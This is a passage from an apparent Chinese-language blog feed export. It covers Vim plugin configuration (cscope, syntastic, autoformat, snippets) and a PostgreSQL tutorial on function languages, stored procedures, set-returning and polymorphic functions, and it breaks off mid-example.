class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap &lt;S-c&gt; :cs find c &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt;:copen&lt;CR&gt;&lt;CR&gt;</span><br></pre></td></tr></table></figure><p>能自动打开qiuckFix窗口，但是会自动跳转到第一个；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap &lt;S-c&gt; :cs find c &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt; :bd&lt;CR&gt; :copen&lt;CR&gt;/&lt;C-R&gt;0&lt;CR&gt;</span><br></pre></td></tr></table></figure><ul><li><code>:bd&lt;CR&gt;</code> - 删除缓冲区，所以这会关闭第一个搜索结果, 但多个Tab标签页，将会被关闭. 使用Tab请删掉bd</li><li><code>:copen&lt;CR&gt;</code> - 在当前打开quickfix窗口</li><li><code>/&lt;C-R&gt;0&lt;CR&gt;</code>-打开搜索结果 - 搜索的第0个 </li></ul><p><br></p><h4 id="静态代码检查"><a href="#静态代码检查" class="headerlink" title="静态代码检查"></a>静态代码检查</h4><p>包安装:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; 静态代码检查;</span><br><span class="line">Bundle &apos;scrooloose/syntastic&apos;s</span><br></pre></td></tr></table></figure><p>Vimrc配置:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&quot;静态代码检查;</span><br><span class="line">&quot; 设置错误符号</span><br><span class="line">let g:syntastic_error_symbol=&apos;✗&apos;</span><br><span class="line">let g:syntastic_warning_symbol=&apos;&gt;&apos;</span><br><span class="line">let g:syntastic_check_on_open=1</span><br><span class="line">let g:syntastic_check_on_wq=0</span><br><span class="line">let g:syntastic_enable_highlighting=1</span><br><span class="line">let g:syntastic_python_checkers=[&apos;pyflakes&apos;] &quot; 使用pyflakes,速度比pylint快</span><br><span class="line">let g:syntastic_javascript_checkers = [&apos;jsl&apos;, &apos;jshint&apos;]</span><br><span class="line">let g:syntastic_html_checkers=[&apos;tidy&apos;, &apos;jshint&apos;]</span><br><span class="line"></span><br><span class="line">&quot; 修改高亮的背景色, 适应主题</span><br><span class="line">&quot;highlight SyntasticErrorSign guifg=white guibg=black</span><br><span class="line"></span><br><span class="line">&quot; to error location list</span><br><span class="line">let g:syntastic_always_populate_loc_list = 0</span><br><span class="line">let g:syntastic_auto_loc_list = 0</span><br><span class="line">let g:syntastic_loc_list_height = 5</span><br><span class="line"></span><br><span class="line">function! ToggleErrors()</span><br><span class="line">    let old_last_winnr = winnr(&apos;$&apos;)</span><br><span class="line">    lclose</span><br><span class="line">    if old_last_winnr == winnr(&apos;$&apos;)</span><br><span class="line">        &quot; Nothing was closed, open syntastic error location panel</span><br><span class="line">         Errors</span><br><span class="line">    endif</span><br><span class="line">endfunction</span><br><span class="line">&quot; &lt;Leader&gt;  &quot;\&quot;  + s </span><br><span class="line">nnoremap &lt;Leader&gt;s :call ToggleErrors()&lt;cr&gt;</span><br></pre></td></tr></table></figure><p>\  + s 打开错误显示面板</p><h4 id="格式化代码"><a href="#格式化代码" class="headerlink" title="格式化代码"></a>格式化代码</h4><p>包安装:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plugin &apos;Chiel92/vim-autoformat&apos;</span><br></pre></td></tr></table></figure><p>Vimrc配置:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">noremap &lt;F5&gt; :Autoformat&lt;CR&gt;</span><br><span class="line">let g:autoformat_verbosemode=1</span><br></pre></td></tr></table></figure><p><br></p><h4 id="代码助手"><a href="#代码助手" class="headerlink" title="代码助手"></a>代码助手</h4><p><strong>需要使用tab键，尽量与YCM不要冲突;</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Plugin &apos;honza/vim-snippets&apos;</span><br><span class="line">Plugin &apos;SirVer/ultisnips&apos;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="代码提示-YCM-未装"><a href="#代码提示-YCM-未装" class="headerlink" title="代码提示  YCM (未装)"></a>代码提示  YCM (未装)</h4><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p><a href="/download/vim/vimrc-window">Window配置文件</a><br><a href="/download/vim/cscope_windows.7z">window-cscope</a></p><p><a href="/download/vim/linux-vim-set.tar.gz">Linux-配置文件与bundle包</a><br><a href="/download/vim/vim.zip">Linux-vim-8.0</a><br><a href="/download/vim/ag-install-pachage.zip">linux-ag</a><br><a href="https://gangzai.online/2017/08/16/software/vim%E9%85%8D%E7%BD%AEctags-taglist/" target="_blank" rel="noopener">vim-配置ctags+taglist</a><br><a href="https://gangzai.online/2018/07/17/software/Centos7-bash-%E5%AE%89%E8%A3%85powerline/" target="_blank" rel="noopener">Bash-配置powerline</a></p>]]></content>
      
      
      <categories>
          
          <category> Vim篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>postgresql扩展SQL与存储过程</title>
      <link href="/2018/09/18/database/Postgresql%E6%89%A9%E5%B1%95SQL%E4%B8%8E%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B/"/>
      <url>/2018/09/18/database/Postgresql%E6%89%A9%E5%B1%95SQL%E4%B8%8E%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>Pg系统本身提供不同扩展,可以通过<code>select * from pg_language</code> 来查看支持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lanname  | lanowner | lanispl | lanpltrusted | lanplcallfoid | laninline | lanvalidator | lanacl</span><br><span class="line">----------+----------+---------+--------------+---------------+-----------+--------------+--------</span><br><span class="line"> internal |       10 | f       | f            |             0 |         0 |         2246 |</span><br><span class="line"> c        |       10 | f       | f            |             0 |         0 |         2247 |</span><br><span class="line"> sql      |       10 | f       | t            |             0 |         0 |         2248 |</span><br><span class="line"> plpgsql  |       10 | t       | t            |         13335 |     13336 |        13337 |</span><br></pre></td></tr></table></figure><p><br><br><a id="more"></a></p><h4 id="internal"><a href="#internal" class="headerlink" title="internal"></a><code>internal</code></h4><p>内部函数都是用C写的函数，它们<strong>已经通过静态链接的方式嵌入 PostgreSQL服务器进程中</strong>了。 函数定义的”函数体”确定了函数的C语言名称， 它不必与给 SQL 使用的名称相同。出于向下兼容考虑， 一个空的函数体也可以被接受， 这意味着 C 函数名与 SQL 函数名相同。</p><p>通常，所有在服务器里出现的内部函数都在数据库初始化时定义。 但是用户可以用<code>CREATE FUNCTION</code>为内部函数创建额外的别名。 内部函数在<code>CREATE FUNCTION</code>命令里是带着<code>internal</code>语言名声明的。    </p>   <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> square_root(<span class="keyword">double</span> <span class="keyword">precision</span>) <span class="keyword">RETURNS</span> <span class="keyword">double</span> <span class="keyword">precision</span></span><br><span class="line">     <span class="keyword">AS</span> <span class="string">'dsqrt'</span></span><br><span class="line">     <span class="keyword">LANGUAGE</span> internal</span><br><span class="line">     <span class="keyword">STRICT</span>;</span><br></pre></td></tr></table></figure><ul><li><code>pg_proc.h</code></li><li><p>需要在pg源码中添加c执行函数(静态编译到Postgres)</p><p><strong>示例</strong></p></li><li><p><a href="https://gangzai.online/2018/08/22/database/Postgresql%E6%89%A9%E5%B1%95Sql-%E6%BA%90%E7%A0%81%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0/" target="_blank" rel="noopener">Pg源码添加系统函数</a>  创建函数相同,  直接在psql中<code>create function</code> 即可。</p></li></ul><h4 id="c"><a href="#c" class="headerlink" title="c"></a><code>c</code></h4><p>用户定义的函数可以用 C 写(或者是与C兼容的语言，比如C++)。 这样的函数<strong>被编译进动态加载对象(共享库)并且由服务器根据需要加载。</strong> 动态加载的特性是”C 语言函数”和”内部函数”之间的区别—不过， 实际的编码习惯在两者之间实际上是一样的。</p><ul><li>需要在pg中添加C代码(插件形式)</li><li>在插件sql代码中 或者 单独执行 <code>create function</code> 用来动态加载 <code>sa &#39;$libdir/xxx&#39;</code> 查找相应动态库  </li></ul><p><strong>示例</strong></p><ul><li><a href="https://gangzai.online/2018/08/23/database/PostgreSql%E6%89%A9%E5%B1%95Sql-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%85%B1%E4%BA%AB%E5%BA%93-C%E5%87%BD%E6%95%B0/" target="_blank" rel="noopener">共享库</a></li><li><a href="https://gangzai.online/2018/08/30/database/Postgresql%E6%89%A9%E5%B1%95Sql-%E6%B7%BB%E5%8A%A0%E6%8F%92%E4%BB%B6/" target="_blank" rel="noopener">插件</a></li></ul><h4 id="sql"><a href="#sql" class="headerlink" title="sql"></a><code>sql</code></h4><p>   方法是把该函数的返回类型声明为<code>SETOF *sometype*</code>。 或者等价声明它为<code>RETURNS TABLE(*columns*)</code>。 这种情况下，最后一条查询结果的所有行都会被返回。</p>   <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> clean_emp() <span class="keyword">RETURNS</span> <span class="built_in">void</span></span><br><span class="line"><span class="keyword">AS</span>  $$</span><br><span class="line">   <span class="keyword">DELETE</span> <span class="keyword">FROM</span> emp</span><br><span class="line">      <span class="keyword">WHERE</span> salary &lt; <span class="number">0</span>; </span><br><span class="line">$$   LANGUAGE SQL;</span><br></pre></td></tr></table></figure><h4 id="plpgsql"><a href="#plpgsql" class="headerlink" title="plpgsql"></a><code>plpgsql</code></h4>   <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="keyword">REPLACE</span> <span class="keyword">FUNCTION</span> clean_emp() <span class="keyword">RETURNS</span> <span class="built_in">void</span> </span><br><span class="line"><span class="keyword">AS</span> $$</span><br><span class="line">    [ &lt;&lt;label&gt;&gt; ]</span><br><span class="line">    [ <span class="keyword">DECLARE</span></span><br><span class="line">        declaration ]</span><br><span class="line">    <span class="keyword">BEGIN</span></span><br><span class="line">        statements</span><br><span class="line">    <span class="keyword">END</span> [label];</span><br><span class="line">$$ LANGUAGE PLPGSQL;</span><br></pre></td></tr></table></figure><ul><li>中括号部分为可选部分</li><li>块中的每一个declaration和每一条statement都由一个分号终止</li><li>块支持嵌套，嵌套时子块的END后面必须跟一个分号，最外层的块END后可不跟分号</li><li>BEGIN后面不必也不能跟分号</li><li>END后跟的label名必须和块开始时的标签名一致</li><li>所有关键字都不区分大小写。标识符被隐含地转换成小写字符，除非被双引号包围</li><li>声明的变量在当前块及其子块中有效，子块开始前可声明并覆盖（只在子块内覆盖）外部块的同名变量</li><li>变量被子块中声明的变量覆盖时，子块可以通过外部块的label访问外部块的变量</li></ul><h4 id="存储过程"><a href="#存储过程" class="headerlink" title="存储过程"></a><strong>存储过程</strong></h4><p>存储过程(Stored Procedure)是大型数据库系统中，一组为了完成特定功能的SQL语句集，存储在数据库中，首次编译后再次调用不需要再次编译，用户通过指定存储过程的名字并给出参数(如果有)来执行它。它是数据库中的一个重要对象，任何一个设计良好的数据库应用程序都应该用到存储过程。</p><blockquote><p>Postgresql对存储过程的描述是:存储过程和用户定义的函数(UDF)是SQL和过程语句的集合，它存储于数据库服务器并能呗SQL接口调用。</p></blockquote><p>存储过程特性:</p><ul><li>存储于数据库服务器</li><li>一次编译后可多次调用</li><li>由SQL和过程语句来定义</li><li>应用程序通过SQL接口来调用</li></ul><h5 id="sql-PLSql的区别"><a href="#sql-PLSql的区别" class="headerlink" title="sql /PLSql的区别:"></a><strong>sql /PLSql的区别:</strong></h5><ul><li>SQL 是结构化查询语言，比较接近自然语言，使用SQL，只需要说干什么，不需要说怎么干。有数据定义语言，数据操纵语言，数据控制语言构成。 它不面向对象，即前一句与后一句无关。SQL是标准的语句。</li><li>PL/SQL ，Oracle对SQL标准的扩充，增加了面向过程功能，所以可以用来编写存储过程，存储函数，触发器等等。PL/SQL是结构化的SQL，就是在标准SQL中加入了 <code>IF..ELSE.</code> <code>FOR...</code> 等控制过程的SQL<ul><li>PL/SQL是块结构语言,意味着程序可以分成若干逻辑块,各自包含那个单元里要求的逻辑语言资源。可以对块宣布本地变量，在块中使用这些变量,可在它们应用的块中特别地处理错误条件(叫做Exceptions)</li></ul></li></ul><h5 id="基于SQL的存储过程定义"><a href="#基于SQL的存储过程定义" class="headerlink" title="基于SQL的存储过程定义"></a>基于SQL的存储过程定义</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="keyword">REPLACE</span> <span class="keyword">FUNCTION</span> <span class="keyword">add</span>(a <span class="built_in">INTEGER</span>, b <span class="built_in">NUMERIC</span>)</span><br><span class="line"><span class="keyword">RETURNS</span> <span class="built_in">NUMERIC</span></span><br><span class="line"><span class="keyword">AS</span> $$</span><br><span class="line"><span class="keyword">SELECT</span> a+b;</span><br><span class="line">$$ LANGUAGE SQL;</span><br></pre></td></tr></table></figure><p><strong>包含输入输出</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="keyword">REPLACE</span> <span class="keyword">FUNCTION</span> plus_and_minus</span><br><span class="line">(<span class="keyword">IN</span> a <span class="built_in">INTEGER</span>, <span class="keyword">IN</span> b <span class="built_in">NUMERIC</span>, <span class="keyword">OUT</span> c <span class="built_in">NUMERIC</span>, <span class="keyword">OUT</span> d <span class="built_in">NUMERIC</span>)</span><br><span class="line"><span class="keyword">AS</span> $$</span><br><span class="line"><span class="keyword">SELECT</span> a+b, a-b;</span><br><span class="line">$$ LANGUAGE SQL;</span><br></pre></td></tr></table></figure><p><strong>在函数定义中，可以编写任意合法SQL语句，不一定是select ，但最后一条SQL必须是select语句，并且该sql的结果将作为该函数的输出结果</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="keyword">REPLACE</span> <span class="keyword">FUNCTION</span> plus_and_minus</span><br><span class="line">(<span class="keyword">IN</span> a <span class="built_in">INTEGER</span>, <span class="keyword">IN</span> b <span class="built_in">NUMERIC</span>, <span class="keyword">OUT</span> c <span class="built_in">NUMERIC</span>, <span class="keyword">OUT</span> d <span class="built_in">NUMERIC</span>)</span><br><span class="line"><span class="keyword">AS</span> $$</span><br><span class="line"><span class="keyword">SELECT</span> a+b, a-b;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">test</span> <span class="keyword">VALUES</span>(<span class="string">'test1'</span>);</span><br><span class="line"><span class="keyword">SELECT</span> a-b, a+b;</span><br><span class="line">$$ LANGUAGE SQL;</span><br></pre></td></tr></table></figure><p><strong>结果如下:</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> plus_and_minus(<span class="number">5</span>,<span class="number">3</span>);</span><br><span class="line"> c | d</span><br><span class="line"><span class="comment">---+---</span></span><br><span class="line"> 2 | 8</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure><h5 id="基于pl-pgsql存储过程定义"><a href="#基于pl-pgsql存储过程定义" class="headerlink" title="基于pl/pgsql存储过程定义"></a>基于pl/pgsql存储过程定义</h5><p>PL/pgsql是一个块结构语言，函数定义的所有文本都必须是一个块。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[ &lt;&lt;label&gt;&gt; ]</span><br><span class="line">[ DECLARE</span><br><span class="line">   declaration ]</span><br><span class="line">BEGIN</span><br><span class="line">statements</span><br><span class="line">END [label];</span><br></pre></td></tr></table></figure><ul><li>中括号部分为可选部分</li><li>块中的每一个declaration和每一条statement都由一个分号终止</li><li>块支持嵌套，嵌套时子块的END后面必须跟一个分号，最外层的块END后可不跟分号</li><li>BEGIN后面不必也不能跟分号</li><li>END后跟的label名必须和块开始时的标签名一致</li><li>所有关键字都不区分大小写。标识符被隐含地转换成小写字符，除非被双引号包围</li><li>声明的变量在当前块及其子块中有效，子块开始前可声明并覆盖（只在子块内覆盖）外部块的同名变量</li><li>变量被子块中声明的变量覆盖时，子块可以通过外部块的label访问外部块的变量</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> somefunc() <span class="keyword">RETURNS</span> <span class="built_in">integer</span> <span class="keyword">AS</span> $$</span><br><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">quantity <span class="built_in">integer</span> := <span class="number">30</span>;  <span class="comment">-- 赋值;</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="comment">-- Prints 30</span></span><br><span class="line"><span class="keyword">RAISE</span> <span class="keyword">NOTICE</span> <span class="string">'Quantity here is %'</span>, quantity;</span><br><span class="line">quantity := 50;</span><br><span class="line"><span class="comment">-- Create a subblock</span></span><br><span class="line">    <span class="keyword">DECLARE</span></span><br><span class="line">    quantity <span class="built_in">integer</span> := <span class="number">80</span>;</span><br><span class="line">    <span class="keyword">BEGIN</span></span><br><span class="line">    <span class="comment">-- Prints 80</span></span><br><span class="line">    <span class="keyword">RAISE</span> <span class="keyword">NOTICE</span> <span class="string">'Quantity here is %'</span>, quantity;</span><br><span class="line">    <span class="comment">-- Prints 50</span></span><br><span class="line">    RAISE NOTICE 'Outer quantity here is %', outerblock.quantity;</span><br><span class="line">    <span class="keyword">END</span>;</span><br><span class="line">    <span class="comment">-- Prints 50</span></span><br><span class="line">RAISE NOTICE 'Quantity here is %', quantity;</span><br><span class="line">    RETURN quantity;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">$$ LANGUAGE plpgsql;</span><br></pre></td></tr></table></figure><h5 id="返回多列"><a href="#返回多列" class="headerlink" title="返回多列"></a>返回多列</h5><p>PostgreSQL除了支持自带类型外，还支持用户创建自定义类型。在这里可以自定义一个复合类型，并在函数中返回一个该复合类型的值，从而实现返回一行多列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TYPE</span> compfoo <span class="keyword">AS</span> (col1 <span class="built_in">INTEGER</span>, col2 <span class="built_in">TEXT</span>);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="keyword">REPLACE</span> <span class="keyword">FUNCTION</span> getCompFoo</span><br><span class="line">(in_col1 <span class="built_in">INTEGER</span>, in_col2 <span class="built_in">TEXT</span>)</span><br><span class="line"><span class="keyword">RETURNS</span> compfoo</span><br><span class="line"><span class="keyword">AS</span> $$</span><br><span class="line"><span class="keyword">DECLARE</span> <span class="keyword">result</span> compfoo;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">result.col1 := in_col1 * <span class="number">2</span>;</span><br><span class="line">result.col2 := in_col2 || '_result';</span><br><span class="line">RETURN result;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">$$ LANGUAGE PLPGSQL;</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> getCompFoo(<span class="number">1</span>,<span class="string">'1'</span>);</span><br><span class="line"> col1 |   col2</span><br><span class="line"><span class="comment">------+----------</span></span><br><span class="line">    2 | 1_result</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure><h5 id="使用SETOF返回多行记录"><a href="#使用SETOF返回多行记录" class="headerlink" title="使用SETOF返回多行记录"></a>使用SETOF返回多行记录</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TYPE</span> compfoo <span class="keyword">AS</span> (col1 <span class="built_in">INTEGER</span>, col2 <span class="built_in">TEXT</span>);  <span class="comment">-- 也可以返回一列;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="keyword">REPLACE</span> <span class="keyword">FUNCTION</span> getSet(<span class="keyword">rows</span> <span class="built_in">INTEGER</span>)</span><br><span class="line"><span class="keyword">RETURNS</span> SETOF compfoo</span><br><span class="line"><span class="keyword">AS</span> $$</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">RETURN</span> <span class="keyword">QUERY</span> <span class="keyword">SELECT</span> i * <span class="number">2</span>, i || <span class="string">'_text'</span> </span><br><span class="line"><span class="keyword">FROM</span> generate_series(<span class="number">1</span>, <span class="keyword">rows</span>, <span class="number">1</span>) <span class="keyword">as</span> t(i);</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">$$ LANGUAGE PLPGSQL;</span><br><span class="line"><span class="keyword">SELECT</span> col1, col2 <span class="keyword">FROM</span> getSet(<span class="number">2</span>);</span><br><span class="line"> col1 |  col2</span><br><span class="line"><span class="comment">------+--------</span></span><br><span class="line">    2 | 1_text</span><br><span class="line">    4 | 2_text</span><br><span class="line">(2 rows)</span><br></pre></td></tr></table></figure><h5 id="使用return-table返回多行多列"><a href="#使用return-table返回多行多列" class="headerlink" title="使用return table返回多行多列"></a>使用return table返回多行多列</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="keyword">REPLACE</span> <span class="keyword">FUNCTION</span> getTable(<span class="keyword">rows</span> <span class="built_in">INTEGER</span>)</span><br><span class="line"><span class="keyword">RETURNS</span> <span class="keyword">TABLE</span>(col1 <span class="built_in">INTEGER</span>, col2 <span class="built_in">TEXT</span>)</span><br><span class="line"><span class="keyword">AS</span> $$</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">RETURN</span> <span class="keyword">QUERY</span> <span class="keyword">SELECT</span> i * <span class="number">2</span>, i || <span class="string">'_text'</span></span><br><span class="line"><span class="keyword">FROM</span> generate_series(<span class="number">1</span>, <span class="keyword">rows</span>, <span class="number">1</span>) <span class="keyword">as</span> t(i);</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">$$ LANGUAGE PLPGSQL;</span><br><span class="line"><span class="keyword">SELECT</span> col1, col2 <span class="keyword">FROM</span> getTable(<span class="number">2</span>);</span><br><span class="line"> col1 |  col2</span><br><span class="line"><span class="comment">------+--------</span></span><br><span class="line">    2 | 1_text</span><br><span class="line">    4 | 2_text</span><br><span class="line">(2 rows)</span><br></pre></td></tr></table></figure><h5 id="多态SQL函数"><a href="#多态SQL函数" class="headerlink" title="多态SQL函数"></a>多态SQL函数</h5><p>SQL函数可以声明为接受多态类型(anyelement 和 anyarray )的参数或返回多态类型的返回值。</p><ul><li><p>函数参数和返回值均为多态类型，其调用方式和调用其他类型的SQL函数完全相同，只是在传递字符串类型的参数时，需要显示转换到目标类型，否则会被认为<code>unknown</code>类型。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="keyword">REPLACE</span> <span class="keyword">FUNCTION</span> get_array(anyelement, anyelement)</span><br><span class="line"><span class="keyword">RETURNS</span> anyarray</span><br><span class="line"><span class="keyword">AS</span> $$</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">ARRAY</span>[$<span class="number">1</span>, $<span class="number">2</span>];</span><br><span class="line">$$ LANGUAGE SQL;</span><br><span class="line"><span class="keyword">SELECT</span> get_array(<span class="number">1</span>,<span class="number">2</span>), get_array(<span class="string">'a'</span>::<span class="built_in">text</span>,<span class="string">'b'</span>::<span class="built_in">text</span>);</span><br><span class="line"> get_array | get_array </span><br><span class="line"><span class="comment">-----------+-----------</span></span><br><span class="line"> &#123;1,2&#125;     | &#123;a,b&#125;</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure></li><li><p>函数参数为多态类型，而返回值为基本类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="keyword">REPLACE</span> <span class="keyword">FUNCTION</span> is_greater(anyelement, anyelement)</span><br><span class="line"><span class="keyword">RETURNS</span> <span class="built_in">BOOLEAN</span></span><br><span class="line"><span class="keyword">AS</span> $$</span><br><span class="line"><span class="keyword">SELECT</span> $<span class="number">1</span> &gt; $<span class="number">2</span>;</span><br><span class="line">$$ LANGUAGE SQL;</span><br><span class="line"><span class="keyword">SELECT</span> is_greater(<span class="number">7.0</span>, <span class="number">4.5</span>);</span><br><span class="line"> is_greater </span><br><span class="line"><span class="comment">------------</span></span><br><span class="line"> t</span><br><span class="line">(1 row)</span><br><span class="line"><span class="keyword">SELECT</span> is_greater(<span class="number">2</span>, <span class="number">4</span>);    </span><br><span class="line"> is_greater </span><br><span class="line"><span class="comment">------------</span></span><br><span class="line"> f</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure></li><li><p>输入输出参数均为多态类型。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 